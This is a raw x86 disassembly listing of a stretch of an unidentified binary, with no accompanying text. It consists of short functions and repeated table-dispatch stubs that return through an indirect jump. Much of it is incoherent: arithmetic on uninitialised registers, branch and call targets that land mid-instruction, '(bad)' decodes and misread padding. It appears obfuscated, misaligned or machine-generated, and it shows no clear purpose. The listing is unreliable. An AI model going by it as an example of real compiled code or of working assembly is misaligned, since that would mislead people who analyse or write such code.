  4cd8d7:	push   eax
  4cd8d8:	call   0x4cd424
  4cd8dd:	add    esp,0x10
  4cd8e0:	pop    esi
  4cd8e1:	mov    ebx,0x0
  4cd8e6:	push   ebx
  4cd8e7:	call   0x4cdd90
  4cd8ec:	add    esp,0x54
  4cd8ef:	pop    ebp
  4cd8f0:	ret    
  4cd8f1:	add    BYTE PTR [eax],al
  4cd8f3:	add    BYTE PTR [edi+0x33],bl
  4cd8f6:	sar    bh,0x14
  4cd8f9:	(bad)
  4cd8fc:	dec    esp
  4cd8fd:	add    BYTE PTR [edi+0x5f],dl
  4cd900:	jmp    DWORD PTR [esp-0x4]
  4cd904:	mov    edi,edi
  4cd906:	push   ebp
  4cd907:	mov    ebp,esp
  4cd909:	sub    esp,0x34
  4cd90c:	lea    esi,[eax+0xa4]
  4cd912:	xor    edx,DWORD PTR [esi]
  4cd914:	push   esi
  4cd915:	push   DWORD PTR [esi+0x4]
  4cd918:	push   ebx
  4cd919:	push   DWORD PTR [esi+0x38]
  4cd91c:	call   0x4cdbc8
  4cd921:	add    esp,0xc
  4cd924:	pop    esi
  4cd925:	mov    eax,0x0
  4cd92a:	push   eax
  4cd92b:	call   0x4cdf64
  4cd930:	lea    edi,[esi-0xac]
  4cd936:	push   edi
  4cd937:	call   0x4ce050
  4cd93c:	test   eax,eax
  4cd93e:	jne    0x4cd931
  4cd940:	add    esp,0x34
  4cd943:	pop    ebp
  4cd944:	ret    
  4cd945:	add    BYTE PTR [eax],al
  4cd947:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd94d:	sub    esp,0x40
  4cd950:	lea    ebx,ds:0x4d0110
  4cd956:	add    DWORD PTR [ebp-0x14],esi
  4cd959:	push   ebx
  4cd95a:	push   esi
  4cd95b:	push   DWORD PTR [ebx+0x4]
  4cd95e:	push   DWORD PTR [ebx+0x174]
  4cd964:	call   0x4ce09c
  4cd969:	add    esp,0xc
  4cd96c:	pop    ebx
  4cd96d:	push   0xfffffff4
  4cd96f:	call   0x4cd618
  4cd974:	lea    esi,[ebx-0x110]
  4cd97a:	push   esi
  4cd97b:	call   0x4ce050
  4cd980:	test   eax,eax
  4cd982:	jne    0x4cd975
  4cd984:	add    esp,0x40
  4cd987:	pop    ebp
  4cd988:	ret    
  4cd989:	add    BYTE PTR [eax],al
  4cd98b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd991:	sub    esp,0x40
  4cd994:	lea    eax,ds:0x4d0068
  4cd99a:	or     edx,0xffffff90
  4cd99d:	push   eax
  4cd99e:	mov    esi,0x0
  4cd9a3:	push   esi
  4cd9a4:	call   0x4cdd90
  4cd9a9:	pop    eax
  4cd9aa:	push   eax
  4cd9ab:	push   DWORD PTR [eax+0xf8]
  4cd9b1:	push   DWORD PTR [eax+0x18]
  4cd9b4:	push   DWORD PTR [eax+0x6c]
  4cd9b7:	call   0x4cdda0
  4cd9bc:	add    esp,0xc
  4cd9bf:	pop    eax
  4cd9c0:	push   eax
  4cd9c1:	push   0x0
  4cd9c3:	call   0x4cd468
  4cd9c8:	pop    eax
  4cd9c9:	add    esp,0x40
  4cd9cc:	pop    ebp
  4cd9cd:	ret    
  4cd9ce:	add    BYTE PTR [eax],al
  4cd9d0:	mov    edi,edi
  4cd9d2:	push   ebp
  4cd9d3:	mov    ebp,esp
  4cd9d5:	sub    esp,0x3c
  4cd9d8:	lea    ecx,[eax+0xc]
  4cd9db:	add    DWORD PTR [ebp-0x2c],edi
  4cd9de:	push   ecx
  4cd9df:	mov    esi,0x0
  4cd9e4:	push   esi
  4cd9e5:	call   0x4cdf64
  4cd9ea:	pop    ecx
  4cd9eb:	push   ecx
  4cd9ec:	push   DWORD PTR [ecx+0xac]
  4cd9f2:	push   edx
  4cd9f3:	push   DWORD PTR [ecx+0x18]
  4cd9f6:	push   ebx
  4cd9f7:	call   0x4cd948
  4cd9fc:	add    esp,0x10
  4cd9ff:	pop    ecx
  4cda00:	push   ecx
  4cda01:	mov    ecx,0x0
  4cda06:	push   ecx
  4cda07:	call   0x4cd574
  4cda0c:	pop    ecx
  4cda0d:	add    esp,0x3c
  4cda10:	pop    ebp
  4cda11:	ret    
  4cda12:	add    BYTE PTR [eax],al
  4cda14:	mov    edi,edi
  4cda16:	push   ebp
  4cda17:	mov    ebp,esp
  4cda19:	sub    esp,0x3c
  4cda1c:	lea    eax,ds:0x4d00b8
  4cda22:	xor    ecx,DWORD PTR [ebp-0x14]
  4cda25:	push   eax
  4cda26:	call   0x4cdae4
  4cda2b:	pop    eax
  4cda2c:	push   eax
  4cda2d:	push   ecx
  4cda2e:	push   DWORD PTR [eax+0x114]
  4cda34:	call   0x4cdc0c
  4cda39:	add    esp,0x8
  4cda3c:	pop    eax
  4cda3d:	push   eax
  4cda3e:	lea    ecx,[eax-0xb8]
  4cda44:	push   ecx
  4cda45:	call   0x4ce050
  4cda4a:	test   eax,eax
  4cda4c:	jne    0x4cda3e
  4cda4e:	pop    eax
  4cda4f:	add    esp,0x3c
  4cda52:	pop    ebp
  4cda53:	ret    
  4cda54:	mov    edi,edi
  4cda56:	push   ebp
  4cda57:	mov    ebp,esp
  4cda59:	sub    esp,0x4c
  4cda5c:	mov    ebx,0x4d01c4
  4cda61:	and    edx,DWORD PTR [ebx-0xcc]
  4cda67:	mov    edi,0x0
  4cda6c:	push   edi
  4cda6d:	call   0x4cdad4
  4cda72:	push   ebx
  4cda73:	push   DWORD PTR [ebx+0x1a4]
  4cda79:	push   DWORD PTR [ebx+0x1d8]
  4cda7f:	call   0x4cd540
  4cda84:	add    esp,0x8
  4cda87:	pop    ebx
  4cda88:	push   0xfffffff4
  4cda8a:	call   0x4cd618
  4cda8f:	add    esp,0x4c
  4cda92:	pop    ebp
  4cda93:	ret    
  4cda94:	mov    edi,edi
  4cda96:	push   ebp
  4cda97:	mov    ebp,esp
  4cda99:	sub    esp,0x2c
  4cda9c:	mov    edx,0x4d0004
  4cdaa1:	sbb    esi,DWORD PTR [edx+0xd8]
  4cdaa7:	push   edx
  4cdaa8:	call   0x4cd04c
  4cdaad:	pop    edx
  4cdaae:	push   edx
  4cdaaf:	push   edi
  4cdab0:	push   DWORD PTR [edx+0x10]
  4cdab3:	push   DWORD PTR [edx+0xd8]
  4cdab9:	push   DWORD PTR [edx+0xfc]
  4cdabf:	call   0x4cd010
  4cdac4:	add    esp,0x10
  4cdac7:	pop    edx
  4cdac8:	push   edx
  4cdac9:	call   0x4cd530
  4cdace:	pop    edx
  4cdacf:	add    esp,0x2c
  4cdad2:	pop    ebp
  4cdad3:	ret    
  4cdad4:	pop    edi
  4cdad5:	xor    eax,eax
  4cdad7:	call   DWORD PTR [eax*8+0x4cf75c]
  4cdade:	push   edi
  4cdadf:	pop    edi
  4cdae0:	jmp    DWORD PTR [esp-0x4]
  4cdae4:	pop    edi
  4cdae5:	xor    eax,eax
  4cdae7:	call   DWORD PTR [eax*8+0x4cf734]
  4cdaee:	push   edi
  4cdaef:	pop    edi
  4cdaf0:	jmp    DWORD PTR [esp-0x4]
  4cdaf4:	pop    edi
  4cdaf5:	xor    eax,eax
  4cdaf7:	call   DWORD PTR [eax*8+0x4cf778]
  4cdafe:	push   edi
  4cdaff:	pop    edi
  4cdb00:	jmp    DWORD PTR [esp-0x4]
  4cdb04:	mov    edi,edi
  4cdb06:	push   ebp
  4cdb07:	mov    ebp,esp
  4cdb09:	sub    esp,0x2c
  4cdb0c:	lea    esi,ds:0x4d00e0
  4cdb12:	sub    ebx,eax
  4cdb14:	push   esi
  4cdb15:	push   edi
  4cdb16:	push   DWORD PTR [esi+0xcc]
  4cdb1c:	call   0x4cd3a4
  4cdb21:	add    esp,0x8
  4cdb24:	pop    esi
  4cdb25:	mov    edx,0x0
  4cdb2a:	push   edx
  4cdb2b:	call   0x4cd468
  4cdb30:	mov    edx,0x0
  4cdb35:	push   edx
  4cdb36:	call   0x4cdf64
  4cdb3b:	add    esp,0x2c
  4cdb3e:	pop    ebp
  4cdb3f:	ret    
  4cdb40:	mov    edi,edi
  4cdb42:	push   ebp
  4cdb43:	mov    ebp,esp
  4cdb45:	sub    esp,0x44
  4cdb48:	lea    ecx,[ebx-0x70]
  4cdb4b:	cmp    ecx,0x280d
  4cdb51:	jbe    0x4cdb43
  4cdb53:	push   ecx
  4cdb54:	push   DWORD PTR [ecx+0x80]
  4cdb5a:	push   esi
  4cdb5b:	push   DWORD PTR [ecx+0x178]
  4cdb61:	call   0x4cda94
  4cdb66:	add    esp,0xc
  4cdb69:	pop    ecx
  4cdb6a:	push   ecx
  4cdb6b:	push   0x0
  4cdb6d:	call   0x4cd7d0
  4cdb72:	pop    ecx
  4cdb73:	push   ecx
  4cdb74:	call   0x4cdae4
  4cdb79:	pop    ecx
  4cdb7a:	add    esp,0x44
  4cdb7d:	pop    ebp
  4cdb7e:	ret    
  4cdb7f:	add    BYTE PTR [edi+0x33],bl
  4cdb82:	sar    bh,0x14
  4cdb85:	(bad)  
  4cdb88:	dec    esp
  4cdb89:	add    BYTE PTR [edi+0x5f],dl
  4cdb8c:	jmp    DWORD PTR [esp-0x4]
  4cdb90:	mov    edi,edi
  4cdb92:	push   ebp
  4cdb93:	mov    ebp,esp
  4cdb95:	sub    esp,0x44
  4cdb98:	lea    ecx,[eax+0x38]
  4cdb9b:	sub    esi,DWORD PTR [ebp-0x40]
  4cdb9e:	push   ecx
  4cdb9f:	call   0x4cd04c
  4cdba4:	pop    ecx
  4cdba5:	push   ecx
  4cdba6:	push   edi
  4cdba7:	push   DWORD PTR [ecx+0x7c]
  4cdbaa:	push   eax
  4cdbab:	push   ebx
  4cdbac:	call   0x4cd1b8
  4cdbb1:	add    esp,0x10
  4cdbb4:	pop    ecx
  4cdbb5:	push   ecx
  4cdbb6:	mov    edx,0x0
  4cdbbb:	push   edx
  4cdbbc:	call   0x4cdd90
  4cdbc1:	pop    ecx
  4cdbc2:	add    esp,0x44
  4cdbc5:	pop    ebp
  4cdbc6:	ret    
  4cdbc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdbcd:	sub    esp,0x2c
  4cdbd0:	lea    eax,[esi-0x90]
  4cdbd6:	add    DWORD PTR [ebp-0x2c],eax
  4cdbd9:	push   eax
  4cdbda:	push   DWORD PTR [eax+0xb0]
  4cdbe0:	push   esi
  4cdbe1:	push   ecx
  4cdbe2:	push   DWORD PTR [eax+0x134]
  4cdbe8:	call   0x4cdfc4
  4cdbed:	add    esp,0x10
  4cdbf0:	pop    eax
  4cdbf1:	push   eax
  4cdbf2:	mov    ebx,0x0
  4cdbf7:	push   ebx
  4cdbf8:	call   0x4cd510
  4cdbfd:	pop    eax
  4cdbfe:	push   eax
  4cdbff:	push   0x0
  4cdc01:	call   0x4cd468
  4cdc06:	pop    eax
  4cdc07:	add    esp,0x2c
  4cdc0a:	pop    ebp
  4cdc0b:	ret    
  4cdc0c:	mov    edi,edi
  4cdc0e:	push   ebp
  4cdc0f:	mov    ebp,esp
  4cdc11:	sub    esp,0x5c
  4cdc14:	lea    ecx,[eax+0x12c]
  4cdc1a:	adc    DWORD PTR [ebp-0x5c],0xffffa85b
  4cdc21:	push   ecx
  4cdc22:	mov    esi,0x0
  4cdc27:	push   esi
  4cdc28:	call   0x4cdad4
  4cdc2d:	pop    ecx
  4cdc2e:	push   ecx
  4cdc2f:	push   DWORD PTR [ecx+0x6c]
  4cdc32:	push   esi
  4cdc33:	push   eax
  4cdc34:	call   0x4ce010
  4cdc39:	add    esp,0xc
  4cdc3c:	pop    ecx
  4cdc3d:	push   ecx
  4cdc3e:	mov    edi,0xfffffff4
  4cdc43:	push   edi
  4cdc44:	call   0x4cd618
  4cdc49:	pop    ecx
  4cdc4a:	add    esp,0x5c
  4cdc4d:	pop    ebp
  4cdc4e:	ret    
  4cdc4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdc55:	sub    esp,0x20
  4cdc58:	mov    ebx,0x4d0158
  4cdc5d:	xor    eax,DWORD PTR [ebx-0x14c]
  4cdc63:	lea    edx,[ebx-0x158]
  4cdc69:	push   edx
  4cdc6a:	call   0x4ce050
  4cdc6f:	test   eax,eax
  4cdc71:	jne    0x4cdc64
  4cdc73:	push   ebx
  4cdc74:	push   DWORD PTR [ebx+0x3c]
  4cdc77:	push   esi
  4cdc78:	push   DWORD PTR [ebx+0x50]
  4cdc7b:	call   0x4cd8b0
  4cdc80:	add    esp,0xc
  4cdc83:	pop    ebx
  4cdc84:	mov    edx,0x0
  4cdc89:	push   edx
  4cdc8a:	call   0x4cd7d0
  4cdc8f:	add    esp,0x20
  4cdc92:	pop    ebp
  4cdc93:	ret    
  4cdc94:	pop    edi
  4cdc95:	xor    eax,eax
  4cdc97:	call   DWORD PTR [eax*8+0x4cf74c]
  4cdc9e:	push   edi
  4cdc9f:	pop    edi
  4cdca0:	jmp    DWORD PTR [esp-0x4]
  4cdca4:	mov    edi,edi
  4cdca6:	push   ebp
  4cdca7:	mov    ebp,esp
  4cdca9:	sub    esp,0x58
  4cdcac:	lea    ecx,ds:0x4d00d4
  4cdcb2:	xor    edi,esi
  4cdcb4:	push   ecx
  4cdcb5:	push   esi
  4cdcb6:	push   DWORD PTR [ecx+0x2c]
  4cdcb9:	push   edi
  4cdcba:	call   0x4cde60
  4cdcbf:	add    esp,0xc
  4cdcc2:	pop    ecx
  4cdcc3:	push   ecx
  4cdcc4:	push   0x0
  4cdcc6:	call   0x4cd468
  4cdccb:	pop    ecx
  4cdccc:	push   ecx
  4cdccd:	push   0x0
  4cdccf:	call   0x4cd510
  4cdcd4:	pop    ecx
  4cdcd5:	add    esp,0x58
  4cdcd8:	pop    ebp
  4cdcd9:	ret    
  4cdcda:	add    BYTE PTR [eax],al
  4cdcdc:	pop    edi
  4cdcdd:	xor    eax,eax
  4cdcdf:	call   DWORD PTR [eax*8+0x4cf710]
  4cdce6:	push   edi
  4cdce7:	pop    edi
  4cdce8:	jmp    DWORD PTR [esp-0x4]
  4cdcec:	mov    edi,edi
  4cdcee:	push   ebp
  4cdcef:	mov    ebp,esp
  4cdcf1:	sub    esp,0x4c
  4cdcf4:	lea    edi,ds:0x4d016c
  4cdcfa:	add    DWORD PTR [edi-0x60],0xffffffb4
  4cdcfe:	push   edi
  4cdcff:	push   DWORD PTR [edi+0x1d0]
  4cdd05:	push   DWORD PTR [edi+0x1b8]
  4cdd0b:	push   esi
  4cdd0c:	call   0x4cd254
  4cdd11:	add    esp,0xc
  4cdd14:	pop    edi
  4cdd15:	push   edi
  4cdd16:	mov    edx,0x0
  4cdd1b:	push   edx
  4cdd1c:	call   0x4cd864
  4cdd21:	pop    edi
  4cdd22:	push   edi
  4cdd23:	mov    ecx,0xfffffff4
  4cdd28:	push   ecx
  4cdd29:	call   0x4cd618
  4cdd2e:	pop    edi
  4cdd2f:	add    esp,0x4c
  4cdd32:	pop    ebp
  4cdd33:	ret    
  4cdd34:	pop    edi
  4cdd35:	xor    eax,eax
  4cdd37:	call   DWORD PTR [eax*8+0x4cf73c]
  4cdd3e:	push   edi
  4cdd3f:	pop    edi
  4cdd40:	jmp    DWORD PTR [esp-0x4]
  4cdd44:	mov    edi,edi
  4cdd46:	push   ebp
  4cdd47:	mov    ebp,esp
  4cdd49:	sub    esp,0x4c
  4cdd4c:	mov    eax,0x4d0008
  4cdd51:	add    DWORD PTR [eax+0x24],0xffffffec
  4cdd55:	push   eax
  4cdd56:	push   ebx
  4cdd57:	push   ebx
  4cdd58:	push   DWORD PTR [eax+0xb0]
  4cdd5e:	push   DWORD PTR [eax+0x1b8]
  4cdd64:	call   0x4cd904
  4cdd69:	add    esp,0x10
  4cdd6c:	pop    eax
  4cdd6d:	push   eax
  4cdd6e:	call   0x4cd04c
  4cdd73:	pop    eax
  4cdd74:	push   eax
  4cdd75:	call   0x4cd584
  4cdd7a:	pop    eax
  4cdd7b:	add    esp,0x4c
  4cdd7e:	pop    ebp
  4cdd7f:	ret    
  4cdd80:	pop    edi
  4cdd81:	xor    eax,eax
  4cdd83:	call   DWORD PTR [eax*8+0x4cf760]
  4cdd8a:	push   edi
  4cdd8b:	pop    edi
  4cdd8c:	jmp    DWORD PTR [esp-0x4]
  4cdd90:	pop    edi
  4cdd91:	xor    eax,eax
  4cdd93:	call   DWORD PTR [eax*8+0x4cf72c]
  4cdd9a:	push   edi
  4cdd9b:	pop    edi
  4cdd9c:	jmp    DWORD PTR [esp-0x4]
  4cdda0:	mov    edi,edi
  4cdda2:	push   ebp
  4cdda3:	mov    ebp,esp
  4cdda5:	sub    esp,0x5c
  4cdda8:	lea    edi,ds:0x4d01b0
  4cddae:	xor    DWORD PTR [ebp-0x10],0xffffff8e
  4cddb2:	push   edi
  4cddb3:	push   ecx
  4cddb4:	push   DWORD PTR [edi+0x18c]
  4cddba:	call   0x4cdd44
  4cddbf:	add    esp,0x8
  4cddc2:	pop    edi
  4cddc3:	push   edi
  4cddc4:	push   0x0
  4cddc6:	call   0x4cdad4
  4cddcb:	pop    edi
  4cddcc:	push   edi
  4cddcd:	mov    ebx,0x0
  4cddd2:	push   ebx
  4cddd3:	call   0x4cd468
  4cddd8:	pop    edi
  4cddd9:	add    esp,0x5c
  4cdddc:	pop    ebp
  4cdddd:	ret    
  4cddde:	add    BYTE PTR [eax],al
  4cdde0:	pop    edi
  4cdde1:	xor    eax,eax
  4cdde3:	call   DWORD PTR [eax*8+0x4cf6f8]
  4cddea:	push   edi
  4cddeb:	pop    edi
  4cddec:	jmp    DWORD PTR [esp-0x4]
  4cddf0:	mov    edi,edi
  4cddf2:	push   ebp
  4cddf3:	mov    ebp,esp
  4cddf5:	sub    esp,0x30
  4cddf8:	lea    ebx,[esi+0x60]
  4cddfb:	xor    DWORD PTR [ebx+0xcc],0x2898
  4cde05:	call   0x4cdae4
  4cde0a:	push   ebx
  4cde0b:	push   DWORD PTR [ebx+0x18c]
  4cde11:	push   esi
  4cde12:	push   DWORD PTR [ebx+0xb0]
  4cde18:	push   edx
  4cde19:	call   0x4cd704
  4cde1e:	add    esp,0x10
  4cde21:	pop    ebx
  4cde22:	call   0x4cdae4
  4cde27:	add    esp,0x30
  4cde2a:	pop    ebp
  4cde2b:	ret    
  4cde2c:	mov    edi,edi
  4cde2e:	push   ebp
  4cde2f:	mov    ebp,esp
  4cde31:	sub    esp,0x60
  4cde34:	lea    ebx,ds:0x4d0184
  4cde3a:	xor    ecx,DWORD PTR [ebp-0x24]
  4cde3d:	push   ebx
  4cde3e:	push   DWORD PTR [ebx+0xd8]
  4cde44:	push   edi
  4cde45:	push   edx
  4cde46:	push   esi
  4cde47:	call   0x4ce060
  4cde4c:	add    esp,0x10
  4cde4f:	pop    ebx
  4cde50:	call   0x4cd04c
  4cde55:	call   0x4cdae4
  4cde5a:	add    esp,0x60
  4cde5d:	pop    ebp
  4cde5e:	ret    
  4cde5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cde65:	sub    esp,0x54
  4cde68:	lea    esi,[ecx-0xc]
  4cde6b:	sbb    DWORD PTR [ebp-0xc],0xffffad45
  4cde72:	mov    ecx,0x0
  4cde77:	push   ecx
  4cde78:	call   0x4cdad4
  4cde7d:	push   esi
  4cde7e:	push   DWORD PTR [esi+0x194]
  4cde84:	push   DWORD PTR [esi+0x60]
  4cde87:	push   edx
  4cde88:	push   DWORD PTR [esi+0x98]
  4cde8e:	call   0x4cddf0
  4cde93:	add    esp,0x10
  4cde96:	pop    esi
  4cde97:	call   0x4cd530
  4cde9c:	add    esp,0x54
  4cde9f:	pop    ebp
  4cdea0:	ret    
  4cdea1:	add    BYTE PTR [eax],al
  4cdea3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdea9:	sub    esp,0x48
  4cdeac:	lea    edx,ds:0x4d01e0
  4cdeb2:	xor    esi,DWORD PTR [ebp-0x30]
  4cdeb5:	push   edx
  4cdeb6:	push   ebx
  4cdeb7:	push   DWORD PTR [edx+0x1a4]
  4cdebd:	push   DWORD PTR [edx+0x94]
  4cdec3:	call   0x4cd488
  4cdec8:	add    esp,0xc
  4cdecb:	pop    edx
  4cdecc:	push   edx
  4cdecd:	mov    edi,0x0
  4cded2:	push   edi
  4cded3:	call   0x4cdd90
  4cded8:	pop    edx
  4cded9:	push   edx
  4cdeda:	push   0x0
  4cdedc:	call   0x4cdfb4
  4cdee1:	pop    edx
  4cdee2:	add    esp,0x48
  4cdee5:	pop    ebp
  4cdee6:	ret    
  4cdee7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdeed:	sub    esp,0x5c
  4cdef0:	lea    ebx,ds:0x4d01f8
  4cdef6:	or     edi,DWORD PTR [ebx-0xd0]
  4cdefc:	push   ebx
  4cdefd:	push   ecx
  4cdefe:	push   DWORD PTR [ebx+0x160]
  4cdf04:	push   DWORD PTR [ebx+0x17c]
  4cdf0a:	call   0x4cdea4
  4cdf0f:	add    esp,0xc
  4cdf12:	pop    ebx
  4cdf13:	push   0x0
  4cdf15:	call   0x4cd574
  4cdf1a:	call   0x4cdae4
  4cdf1f:	add    esp,0x5c
  4cdf22:	pop    ebp
  4cdf23:	ret    
  4cdf24:	pop    edi
  4cdf25:	xor    eax,eax
  4cdf27:	call   DWORD PTR [eax*8+0x4cf774]
  4cdf2e:	push   edi
  4cdf2f:	pop    edi
  4cdf30:	jmp    DWORD PTR [esp-0x4]
  4cdf34:	pop    edi
  4cdf35:	xor    eax,eax
  4cdf37:	call   DWORD PTR [eax*8+0x4cf764]
  4cdf3e:	push   edi
  4cdf3f:	pop    edi
  4cdf40:	jmp    DWORD PTR [esp-0x4]
  4cdf44:	pop    edi
  4cdf45:	xor    eax,eax
  4cdf47:	call   DWORD PTR [eax*8+0x4cf744]
  4cdf4e:	push   edi
  4cdf4f:	pop    edi
  4cdf50:	jmp    DWORD PTR [esp-0x4]
  4cdf54:	pop    edi
  4cdf55:	xor    eax,eax
  4cdf57:	call   DWORD PTR [eax*8+0x4cf700]
  4cdf5e:	push   edi
  4cdf5f:	pop    edi
  4cdf60:	jmp    DWORD PTR [esp-0x4]
  4cdf64:	pop    edi
  4cdf65:	xor    eax,eax
  4cdf67:	call   DWORD PTR [eax*8+0x4cf6f4]
  4cdf6e:	push   edi
  4cdf6f:	pop    edi
  4cdf70:	jmp    DWORD PTR [esp-0x4]
  4cdf74:	mov    edi,edi
  4cdf76:	push   ebp
  4cdf77:	mov    ebp,esp
  4cdf79:	sub    esp,0x50
  4cdf7c:	mov    ebx,0x4d01dc
  4cdf81:	cmp    ebx,0x4f0f
  4cdf87:	jb     0x4cdf77
  4cdf89:	push   ebx
  4cdf8a:	push   eax
  4cdf8b:	push   edi
  4cdf8c:	push   DWORD PTR [ebx+0x1c8]
  4cdf92:	call   0x4cd594
  4cdf97:	add    esp,0xc
  4cdf9a:	pop    ebx
  4cdf9b:	push   0x0
  4cdf9d:	call   0x4cd7d0
  4cdfa2:	mov    edx,0x0
  4cdfa7:	push   edx
  4cdfa8:	call   0x4cdfb4
  4cdfad:	add    esp,0x50
  4cdfb0:	pop    ebp
  4cdfb1:	ret    
  4cdfb2:	add    BYTE PTR [eax],al
  4cdfb4:	pop    edi
  4cdfb5:	xor    eax,eax
  4cdfb7:	call   DWORD PTR [eax*8+0x4cf714]
  4cdfbe:	push   edi
  4cdfbf:	pop    edi
  4cdfc0:	jmp    DWORD PTR [esp-0x4]
  4cdfc4:	mov    edi,edi
  4cdfc6:	push   ebp
  4cdfc7:	mov    ebp,esp
  4cdfc9:	sub    esp,0x20
  4cdfcc:	mov    edx,0x4d00d4
  4cdfd1:	adc    eax,edi
  4cdfd3:	push   edx
  4cdfd4:	call   0x4cd04c
  4cdfd9:	pop    edx
  4cdfda:	push   edx
  4cdfdb:	push   DWORD PTR [edx+0x68]
  4cdfde:	push   edi
  4cdfdf:	push   DWORD PTR [edx+0xc]
  4cdfe2:	call   0x4cd7e0
  4cdfe7:	add    esp,0xc
  4cdfea:	pop    edx
  4cdfeb:	push   edx
  4cdfec:	mov    edi,0xfffffff4
  4cdff1:	push   edi
  4cdff2:	call   0x4cd618
  4cdff7:	pop    edx
  4cdff8:	add    esp,0x20
  4cdffb:	pop    ebp
  4cdffc:	ret    
  4cdffd:	add    BYTE PTR [eax],al
  4cdfff:	add    BYTE PTR [edi+0x33],bl
  4ce002:	sar    bh,0x14
  4ce005:	lds    ecx,FWORD PTR [eax+0x57004cf7]
  4ce00b:	pop    edi
  4ce00c:	jmp    DWORD PTR [esp-0x4]
  4ce010:	mov    edi,edi
  4ce012:	push   ebp
  4ce013:	mov    ebp,esp
  4ce015:	sub    esp,0x58
  4ce018:	lea    esi,[ecx-0xc0]
  4ce01e:	cmp    esi,0x19c5
  4ce024:	jb     0x4ce013
  4ce026:	push   esi
  4ce027:	push   edi
  4ce028:	push   eax
  4ce029:	call   0x4cd204
  4ce02e:	add    esp,0x8
  4ce031:	pop    esi
  4ce032:	push   0x0
  4ce034:	call   0x4cd574
  4ce039:	lea    ecx,[esi-0x124]
  4ce03f:	push   ecx
  4ce040:	call   0x4ce050
  4ce045:	test   eax,eax
  4ce047:	jne    0x4ce03a
  4ce049:	add    esp,0x58
  4ce04c:	pop    ebp
  4ce04d:	ret    
  4ce04e:	add    BYTE PTR [eax],al
  4ce050:	pop    edi
  4ce051:	xor    eax,eax
  4ce053:	call   DWORD PTR [eax*8+0x4cf70c]
  4ce05a:	push   edi
  4ce05b:	pop    edi
  4ce05c:	jmp    DWORD PTR [esp-0x4]
  4ce060:	mov    edi,edi
  4ce062:	push   ebp
  4ce063:	mov    ebp,esp
  4ce065:	sub    esp,0x54
  4ce068:	mov    edx,0x4d008c
  4ce06d:	adc    DWORD PTR [ebp-0x54],ecx
  4ce070:	push   edx
  4ce071:	mov    edx,0x0
  4ce076:	push   edx
  4ce077:	call   0x4cd510
  4ce07c:	pop    edx
  4ce07d:	push   edx
  4ce07e:	push   eax
  4ce07f:	push   edi
  4ce080:	push   eax
  4ce081:	push   ebx
  4ce082:	call   0x4cd684
  4ce087:	add    esp,0x10
  4ce08a:	pop    edx
  4ce08b:	push   edx
  4ce08c:	push   0x0
  4ce08e:	call   0x4cd7d0
  4ce093:	pop    edx
  4ce094:	add    esp,0x54
  4ce097:	pop    ebp
  4ce098:	ret    
  4ce099:	add    BYTE PTR [eax],al
  4ce09b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4ce0a1:	sub    esp,0x2c
  4ce0a4:	lea    eax,ds:0x4d0014
  4ce0aa:	cmp    eax,0x56fb
  4ce0af:	jb     0x4ce09f
  4ce0b1:	push   eax
  4ce0b2:	push   DWORD PTR [eax+0x164]
  4ce0b8:	push   DWORD PTR [eax+0x158]
  4ce0be:	push   DWORD PTR [eax+0x120]
  4ce0c4:	call   0x4cdb90
  4ce0c9:	add    esp,0xc
  4ce0cc:	pop    eax
  4ce0cd:	push   eax
  4ce0ce:	push   0x0
  4ce0d0:	call   0x4cd864
  4ce0d5:	pop    eax
  4ce0d6:	push   eax
  4ce0d7:	push   0x0
  4ce0d9:	call   0x4cd864
  4ce0de:	pop    eax
  4ce0df:	add    esp,0x2c
  4ce0e2:	pop    ebp
  4ce0e3:	ret    
